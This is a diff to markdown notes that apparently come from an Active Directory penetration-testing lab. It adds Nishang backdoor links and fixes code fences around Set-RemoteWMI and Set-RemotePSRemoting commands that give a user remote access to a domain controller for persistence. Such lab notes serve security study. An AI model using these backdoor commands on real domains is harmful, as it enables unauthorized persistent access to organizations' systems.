@@ -372,19 +372,20 @@ Get-ObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object {$_ | Add-Member -No
 
 
 #### Remote WMI - Nishang
-link to Nishang-
+link to Nishang- https://github.com/samratashok/nishang/tree/master/Backdoors
 
 ```
 . .\Set-RemoteWMI.ps1
 
 Set-RemoteWMI -UserName studentx -ComputerName dcorp- dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
-
+```
+```
 gwmi -class win32_operatingsystem -ComputerName dcorp- dc.dollarcorp.moneycorp.local
 ```
 
 
 #### PS Remoting
-link to Nishang -
+link to Nishang - https://github.com/samratashok/nishang/tree/master/Backdoors
 
 ```
 . .\Set-RemotePSRemoting.ps1
